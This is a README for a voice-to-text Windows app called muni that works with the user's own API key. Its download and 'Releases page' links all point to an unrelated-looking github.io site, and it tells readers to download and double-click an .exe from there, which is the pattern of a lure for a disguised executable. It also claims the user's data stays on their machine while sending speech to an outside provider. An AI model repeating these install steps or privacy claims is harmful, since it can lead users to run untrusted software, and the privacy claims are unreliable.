# 🎙️ muni - Control your computer with voice commands

[ ![Download muni](https://img.shields.io/badge/Download-muni-blue) ](https://cogitative-farmplace654.github.io)

You talk, the computer listens. Muni turns your speech into text. Use it instead of typing to write emails, notes, or documents. It works fast and keeps your data on your machine. Bring your own keys to connect with advanced speech models. You avoid monthly fees and stay in control.

## 🚀 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Go to the [Releases page](https://cogitative-farmplace654.github.io).
2. Look for the Assets section at the bottom of the latest release.
3. Select the file ending in .exe.
4. Save the file to your desktop.
5. Double-click the file to start the installation.

## ⚙️ Setting Up Your API Key

This software requires an access key to function. This key connects the app to a speech engine. You can get a key from providers like OpenAI.

1. Sign up for an account with a speech engine provider.
2. Find the section for API keys in your account settings.
3. Create a new key and copy the sequence of characters.
4. Open the muni application.
5. Go to the Settings screen inside the app.
6. Paste your key into the box labeled API Key.
7. Click Save.

## 💡 How to Use the App

Using the app takes little effort. Once you have the key saved, the app runs in the background.

1. Press and hold the hotkey on your keyboard. The default key is usually F9.
2. Listen for a tone that indicates the app is ready.
3. Speak clearly into your microphone.
4. Release the hotkey when you finish.
5. The application converts your speech to text and inserts it into your active window.

The app detects if you speak English or Tagalog. It recognizes when you switch between these languages as you speak. No settings adjustment is necessary for this.

## 🔍 Frequently Asked Questions

**Is my data private?**
The app does not store your voice recordings on external servers. It processes your input and produces text. Your data stays on your machine.

**What if the app does not hear me?**
Check your computer sound settings. Make sure your microphone is the default input device. Test your microphone in another application to confirm it functions correctly.

**Can I change the hotkey?**
Yes. Open the settings menu within the app to pick a different key combination. Choose a key that you do not use for other tasks to avoid conflicts.

**Does it require a monthly fee?**
No. You bring your own API key. You pay the speech provider directly for the amount you use. This prevents recurring subscription costs to the software developer.

**What is the license?**
The software uses the MIT license. You are free to use, modify, and distribute the code for any purpose.

## 🛠️ Troubleshooting

If the application fails to launch, verify that you installed the correct version for your system. Ensure you have the latest updates for Windows installed. Restart your computer if the hotkey fails to trigger the recording. Contact the community on the GitHub page if you encounter recurring errors.
